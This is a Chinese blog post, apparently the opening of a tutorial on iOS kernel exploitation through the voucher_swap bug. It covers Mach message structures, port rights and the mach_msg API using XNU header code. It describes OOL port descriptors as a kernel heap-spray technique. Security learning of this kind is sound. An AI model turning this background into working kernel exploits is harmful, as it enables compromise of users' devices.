<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"buffer0verflooow.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="buffer0verflooow - Blog">
<meta property="og:url" content="https://buffer0verflooow.github.io/page/33/index.html">
<meta property="og:site_name" content="buffer0verflooow - Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="buffer0verflooow">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://buffer0verflooow.github.io/page/33/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"page/33/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>buffer0verflooow - Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">buffer0verflooow - Blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/home/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">buffer0verflooow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">56</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">51</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2022/03/18/%E4%BB%8Evoucher_swap%E6%BC%8F%E6%B4%9E%E5%BC%80%E5%A7%8B%E5%AD%A6iOS%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/18/%E4%BB%8Evoucher_swap%E6%BC%8F%E6%B4%9E%E5%BC%80%E5%A7%8B%E5%AD%A6iOS%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">从voucher_swap漏洞开始学iOS内核利用</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-03-18 09:38:20" itemprop="dateCreated datePublished" datetime="2022-03-18T09:38:20+08:00">2022-03-18</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-05-02 20:39:22" itemprop="dateModified" datetime="2022-05-02T20:39:22+08:00">2022-05-02</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="Mach消息"><a href="#Mach消息" class="headerlink" title="Mach消息"></a>Mach消息</h3><p>Mach IPC，从Mach微内核派生而来，是最快的IPC机制之一。</p>
<ul>
<li>Mach IPC基于单向通信。</li>
<li>Mach IPC中的通信以Mach消息的形式在端口之间进行，根据消息头中设置的特定位，消息可以是简单的也可以是复杂的。</li>
<li>发送和接收消息必须具有相应的端口权限：<ul>
<li>MACH_PORT_RIGHT_SEND-允许发送消息</li>
<li>MACH_PORT_RIGHT_RECEIVE-允许接收消息</li>
<li>MACH_PORT_RIGHT_SEND_ONCE-允许发送一次消息</li>
<li>MACH_PORT_RIGHT_PORT_SET-面向一组端口接收或发送消息</li>
<li>MACH_PORT_RIGHT_DEAD_NAME-表示因为对应的端口被销毁或者已经发送了一次消息从而无效的SEND或者SEND_ONCE权限</li>
</ul>
</li>
<li>Mach端口权限可以嵌入并通过Mach消息发送。</li>
<li>一个端口可以有多个发送权限，但只有一个接收权限。发送权限可以克隆，接收权限不能。</li>
<li>发送的Mach消息在接收方收到之前，将保存在内核的队列中。</li>
<li>iOS中最重要的二进制文件之一launchd充当引导服务器并允许进程之间相互通信。launchd可以帮助一个进程查找另一个进程，因为所有进程都通过launchd启动并在启动时注册。因此，launchd可以实现节流（throttling）并在某些情况下允许或拒绝查找，从而充当安全控件。launchd非常重要，是第一个启动的守护进程（PID为1），launchd中的任何crash将立即触发内核Panic。</li>
<li>消息由进程内的线程发送和接收，充当进程内的执行单元，但是，端口权限保留在任务级别，并可在任务的ipc_space中找到。</li>
</ul>
<h4 id="简单消息"><a href="#简单消息" class="headerlink" title="简单消息"></a>简单消息</h4><p>简单消息的body会被内核忽略，<code>osfmk/mach/message.h</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="type">mach_msg_size_t</span> msgh_descriptor_count;</span><br><span class="line">&#125; <span class="type">mach_msg_body_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_BODY_NULL (mach_msg_body_t *) 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_DESCRIPTOR_NULL (mach_msg_descriptor_t *) 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>	<span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">mach_msg_bits_t</span>	msgh_bits; <span class="comment">// 包含消息属性的位图</span></span><br><span class="line">  <span class="type">mach_msg_size_t</span>	msgh_size; <span class="comment">// header+body的大小</span></span><br><span class="line">  <span class="type">mach_port_t</span>		msgh_remote_port; <span class="comment">// 目标端口的发送权限</span></span><br><span class="line">  <span class="type">mach_port_t</span>		msgh_local_port; <span class="comment">// 接收端口的接收权限</span></span><br><span class="line">  <span class="type">mach_port_name_t</span>	msgh_voucher_port; <span class="comment">// voucher用于通过键值对传递消息中的数据</span></span><br><span class="line">  <span class="type">mach_msg_id_t</span>		msgh_id; <span class="comment">// 任意32位值</span></span><br><span class="line">&#125; <span class="type">mach_msg_header_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	msgh_reserved		msgh_voucher_port</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_NULL	(mach_msg_header_t *) 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="type">mach_msg_header_t</span>       header;</span><br><span class="line">        <span class="type">mach_msg_body_t</span>         body;</span><br><span class="line">&#125; <span class="type">mach_msg_base_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="type">mach_msg_bits_t</span>;</span><br></pre></td></tr></table></figure>

<p><code>mach_msg_bits_t</code>取值的定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_ZERO		0x00000000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_REMOTE_MASK	0x0000001f</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_LOCAL_MASK	0x00001f00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_VOUCHER_MASK	0x001f0000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	MACH_MSGH_BITS_PORTS_MASK		\</span></span><br><span class="line"><span class="meta">		(MACH_MSGH_BITS_REMOTE_MASK |	\</span></span><br><span class="line"><span class="meta">		 MACH_MSGH_BITS_LOCAL_MASK |	\</span></span><br><span class="line"><span class="meta">		 MACH_MSGH_BITS_VOUCHER_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_COMPLEX		0x80000000U	<span class="comment">/* message is complex */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_USER             0x801f1f1fU	<span class="comment">/* allowed bits user-&gt;kernel */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	MACH_MSGH_BITS_RAISEIMP		0x20000000U	<span class="comment">/* importance raised due to msg */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_DENAP		MACH_MSGH_BITS_RAISEIMP</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	MACH_MSGH_BITS_IMPHOLDASRT	0x10000000U	<span class="comment">/* assertion help, userland private */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_DENAPHOLDASRT	MACH_MSGH_BITS_IMPHOLDASRT</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	MACH_MSGH_BITS_CIRCULAR		0x10000000U	<span class="comment">/* message circular, kernel private */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	MACH_MSGH_BITS_USED		0xb01f1f1fU</span></span><br></pre></td></tr></table></figure>

<ul>
<li>如果<code>MACH_MSGH_BITS_COMPLEX</code>没有打开，内核将假定消息的主体不包含端口权限或 OOL 数据，用户任务在解析消息主体时需要小心，因为消息主体中的mach_msg_type可能会对内容 “撒谎”，从而可能导致未定义的行为。</li>
<li><code>MACH_MSGH_BITS_REMOTE</code>决定如何解释<code>msg_remote_port</code>字段，处理类似于<code>msgt_name</code>，结果必须是send或者send-once类型的权限。</li>
<li><code>MACH_MSGH_BITS_LOCAL</code>决定如何解释<code>msgh_local_port</code>字段，处理方式与<code>msgt_name</code>类似，结果也必须是send或者send-once类型的权限。</li>
<li><code>MACH_MSGH_BITS_VOUCHER</code>决定如何解释<code>msgh_voucher_port</code>字段，处理方式与<code>msgt_nam</code>e类似，结果必须是一个发送权（而且<code>msgh_voucher_port</code>字段必须是一个<code>Mach voucher</code>内核对象的发送权的名称）。</li>
<li><code>MACH_MSGH_BITS()</code>结合了两个<code>MACH_MSG_TYPE_*</code>值，用于远程和本地字段，变成一个适合<code>msgh_bits</code>的单一值。</li>
<li><code>MACH_MSGH_BITS_CIRCULAR</code>应该是零；是内部使用的。</li>
<li>未使用的位应该是零，保留给内核或未来的接口扩展。</li>
</ul>
<p>除了header，还包含一些描述符，在消息主体中指定了描述符的数量（msgh_descriptor_count），<code>BUILD/obj/EXPORT_HDRS/osfmk/mach/message.h</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__LP64__) &amp;&amp; defined(KERNEL)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">mach_msg_port_descriptor_t</span>		port;</span><br><span class="line">  <span class="type">mach_msg_ool_descriptor32_t</span>		out_of_line;</span><br><span class="line">  <span class="type">mach_msg_ool_ports_descriptor32_t</span>	ool_ports;</span><br><span class="line">  <span class="type">mach_msg_type_descriptor_t</span>		type;</span><br><span class="line">&#125; <span class="type">mach_msg_descriptor_t</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">mach_msg_port_descriptor_t</span>		port;</span><br><span class="line">  <span class="type">mach_msg_ool_descriptor_t</span>		out_of_line;</span><br><span class="line">  <span class="type">mach_msg_ool_ports_descriptor_t</span>	ool_ports;</span><br><span class="line">  <span class="type">mach_msg_type_descriptor_t</span>		type;</span><br><span class="line">&#125; <span class="type">mach_msg_descriptor_t</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="type">mach_msg_size_t</span> msgh_descriptor_count;</span><br><span class="line">&#125; <span class="type">mach_msg_body_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_BODY_NULL (mach_msg_body_t *) 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_DESCRIPTOR_NULL (mach_msg_descriptor_t *) 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>	<span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">mach_msg_bits_t</span>	msgh_bits;</span><br><span class="line">  <span class="type">mach_msg_size_t</span>	msgh_size;</span><br><span class="line">  <span class="type">mach_port_t</span>		msgh_remote_port;</span><br><span class="line">  <span class="type">mach_port_t</span>		msgh_local_port;</span><br><span class="line">  <span class="type">mach_port_name_t</span>	msgh_voucher_port;</span><br><span class="line">  <span class="type">mach_msg_id_t</span>		msgh_id;</span><br><span class="line">&#125; <span class="type">mach_msg_header_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	msgh_reserved		msgh_voucher_port</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_NULL	(mach_msg_header_t *) 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="type">mach_msg_header_t</span>       header;</span><br><span class="line">        <span class="type">mach_msg_body_t</span>         body;</span><br><span class="line">&#125; <span class="type">mach_msg_base_t</span>;</span><br></pre></td></tr></table></figure>

<p><code>mach_msg_type_descriptor_t</code>表示是什么类型的描述符，其他字段则包含相应的数据，类型如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 在一个复杂的mach消息中，mach_msg_header_t后面是一个描述符计数，然后是一个包含该数量描述符的数组(mach_msg_*_descriptor_t)</span></span><br><span class="line"><span class="comment"> * mach_msg_type_descriptor_t字段表示该描述符的类型</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 注意，在LP64中，各种类型的描述符不再都是与mach_msg_descriptor_t相同的大小，所以数组不能像预期的那样被索引。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="type">mach_msg_descriptor_type_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_PORT_DESCRIPTOR 		0           <span class="comment">// 在消息中发送一个端口</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_OOL_DESCRIPTOR  		1           <span class="comment">// 在消息中发送OOL数据</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_OOL_PORTS_DESCRIPTOR 		2     <span class="comment">// 在消息中发送OOL端口数组</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_OOL_VOLATILE_DESCRIPTOR  	3   <span class="comment">// 在消息中发送易失性数据</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(4)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">natural_t</span>			pad1;</span><br><span class="line">  <span class="type">mach_msg_size_t</span>		pad2;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span>			pad3 : <span class="number">24</span>;</span><br><span class="line">  <span class="type">mach_msg_descriptor_type_t</span>	type : <span class="number">8</span>;</span><br><span class="line">&#125; <span class="type">mach_msg_type_descriptor_t</span>;</span><br></pre></td></tr></table></figure>

<p>OOL指Out-of-line，OOL端口描述符广泛应用于使用用户控制的数据来进行堆喷。每当使用<code>MACH_MSG_OOL_DESCRIPTOR</code>时，将在内核堆中分配具有所有端口指针的数组。</p>
<p>端口在用户态中用<code>mach_port_t</code>或<code>mach_port_name_t</code>表示，但内核中不采用这种表示。</p>
<ul>
<li><code>mach_port_name_t</code>表示本地命名空间标识，但未关联任何端口权限，并且在任务命名空间之外基本上没有任何意义。</li>
<li>进程从内核处接收到<code>mach_port_t</code>，就会将关联的端口权限映射到接收者，<code>mach_port_name_t</code>则不会。</li>
<li><code>mach_port_t</code>通常至少拥有一项权限，可以是RECEIVE、SEND或SEND_ONCE。</li>
<li>获得<code>mach_port_t</code>的句柄会自动在调用者的命名空间中创建关联的发送权限。</li>
</ul>
<p>发送或接收消息，可以使用<code>osfmk/mach/message.h</code>中定义的<code>mach_msg</code>和<code>mach_msg_overwrite</code> API。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">kern_return_t</span> kret;</span><br><span class="line"><span class="comment">// Initialize a port</span></span><br><span class="line"><span class="type">mach_port_t</span> port;</span><br><span class="line"><span class="comment">// Allocate the port and get a receive right</span></span><br><span class="line">kret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;port);</span><br><span class="line"><span class="keyword">if</span> (kret != KERN_SUCCESS)</span><br><span class="line">	T_FAIL(<span class="string">&quot;mach_port_allocate: %s (%d)&quot;</span>, mach_error_string(kret), kret);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Routine:	mach_msg_overwrite</span></span><br><span class="line"><span class="comment"> *	Purpose:</span></span><br><span class="line"><span class="comment"> *		Send and/or receive a message.  If the message operation</span></span><br><span class="line"><span class="comment"> *		is interrupted, and the user did not request an indication</span></span><br><span class="line"><span class="comment"> *		of that fact, then restart the appropriate parts of the</span></span><br><span class="line"><span class="comment"> *		operation silently (trap version does not restart).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *		Distinct send and receive buffers may be specified.  If</span></span><br><span class="line"><span class="comment"> *		no separate receive buffer is specified, the msg parameter</span></span><br><span class="line"><span class="comment"> *		will be used for both send and receive operations.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *		In addition to a distinct receive buffer, that buffer may</span></span><br><span class="line"><span class="comment"> *		already contain scatter control information to direct the</span></span><br><span class="line"><span class="comment"> *		receiving of the message.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__WATCHOS_PROHIBITED __TVOS_PROHIBITED</span><br><span class="line"><span class="keyword">extern</span> <span class="type">mach_msg_return_t</span>	<span class="title function_">mach_msg_overwrite</span><span class="params">(</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_header_t</span> *msg,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_option_t</span> option,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_size_t</span> send_size,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_size_t</span> rcv_size,</span></span><br><span class="line"><span class="params">					<span class="type">mach_port_name_t</span> rcv_name,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_timeout_t</span> timeout,</span></span><br><span class="line"><span class="params">					<span class="type">mach_port_name_t</span> notify,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_header_t</span> *rcv_msg,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_size_t</span> rcv_limit)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span>	KERNEL</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Routine:	mach_msg</span></span><br><span class="line"><span class="comment"> *	Purpose:</span></span><br><span class="line"><span class="comment"> *		Send and/or receive a message.  If the message operation</span></span><br><span class="line"><span class="comment"> *		is interrupted, and the user did not request an indication</span></span><br><span class="line"><span class="comment"> *		of that fact, then restart the appropriate parts of the</span></span><br><span class="line"><span class="comment"> *		operation silently (trap version does not restart).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__WATCHOS_PROHIBITED __TVOS_PROHIBITED</span><br><span class="line"><span class="keyword">extern</span> <span class="type">mach_msg_return_t</span>	<span class="title function_">mach_msg</span><span class="params">(</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_header_t</span> *msg,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_option_t</span> option,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_size_t</span> send_size,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_size_t</span> rcv_size,</span></span><br><span class="line"><span class="params">					<span class="type">mach_port_name_t</span> rcv_name,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_timeout_t</span> timeout,</span></span><br><span class="line"><span class="params">					<span class="type">mach_port_name_t</span> notify)</span>;</span><br></pre></td></tr></table></figure>

<p>如果有一个端口的发送权限，可以使用<code>mach_port_insert_right</code>将这个发送权限插入另一个任务，然后使用<code>mach_msg</code>发送消息。如前所述，<code>mach_port_name_t</code>在任务命名空间之外毫无意义，这就是为什么需要将<code>任务(ipc_space_t)</code>与<code>mach_port_name_t</code>一起指定的原因，以便内核可以将指定的<code>名称(mach_port_name_t)</code>放入该任务的命名空间。</p>
